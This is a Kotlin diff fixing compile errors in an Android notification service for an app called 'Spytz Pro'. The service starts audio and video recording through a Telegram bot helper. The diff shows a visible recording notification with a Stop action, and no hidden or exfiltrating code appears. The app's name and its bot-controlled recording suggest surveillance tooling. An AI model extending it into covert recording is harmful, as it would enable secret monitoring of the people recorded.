@@ -8,10 +8,7 @@ import android.content.Intent
 import android.os.Build
 import android.os.IBinder
 import androidx.core.app.NotificationCompat
-import kotlinx.coroutines.CoroutineScope
-import kotlinx.coroutines.Dispatchers
-import kotlinx.coroutines.Job
-import kotlinx.coroutines.launch
+import android.R.drawable.ic_dialog_info // Fixed: Using system icon instead of missing local one
 
 class NotificationService : Service() {
 
@@ -37,12 +34,14 @@ class NotificationService : Service() {
             "START_VIDEO" -> {
                 isRecording = true
                 recordingType = "VIDEO"
-                startForeground(NOTIFICATION_ID, createNotification("Video Recording...", true))
+                // Fixed: Call .build() to get Notification object from Builder
+                startForeground(NOTIFICATION_ID, createNotification("Video Recording...", true).build())
             }
             "START_AUDIO" -> {
                 isRecording = true
                 recordingType = "AUDIO"
-                startForeground(NOTIFICATION_ID, createNotification("Voice Recording...", true))
+                // Fixed: Call .build()
+                startForeground(NOTIFICATION_ID, createNotification("Voice Recording...", true).build())
             }
             ACTION_STOP_RECORDING -> {
                 stopRecordingAndNotify()
@@ -55,8 +54,6 @@ class NotificationService : Service() {
         isRecording = false
         if (recordingType == "VIDEO") {
             val file = telegramBotHelper.stopVideoRecording()
-            // Here you can trigger upload logic from your Main Activity or Bot Handler
-            // For now, we just log it. You should expose a callback or broadcast.
             android.util.Log.d("NotificationService", "Video Stopped. File: $file")
         } else if (recordingType == "AUDIO") {
             val file = telegramBotHelper.stopVoiceRecording()
@@ -68,8 +65,9 @@ class NotificationService : Service() {
     }
 
     private fun createNotification(title: String, showProgress: Boolean): NotificationCompat.Builder {
-        val intent = Intent(this, ACTION_STOP_RECORDING).apply {
-            `package` = packageName
+        // Fixed: Create a new Intent with Class constructor instead of setting package manually
+        val intent = Intent(this, NotificationService::class.java).apply {
+            action = ACTION_STOP_RECORDING
         }
         
         val pendingIntent = PendingIntent.getService(
@@ -82,7 +80,7 @@ class NotificationService : Service() {
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("Spytz Pro - ${if(recordingType=="VIDEO") "Video" else "Audio"} Rec")
             .setContentText(title)
-            .setSmallIcon(R.drawable.ic_notification) // Ensure you have an icon in res/drawable
+            .setSmallIcon(ic_dialog_info) // Fixed: Using system icon ID
             .addAction(android.R.drawable.ic_menu_close_clear_cancel, "Stop", pendingIntent)
             .setPriority(NotificationCompat.PRIORITY_HIGH)
             .setOngoing(true)
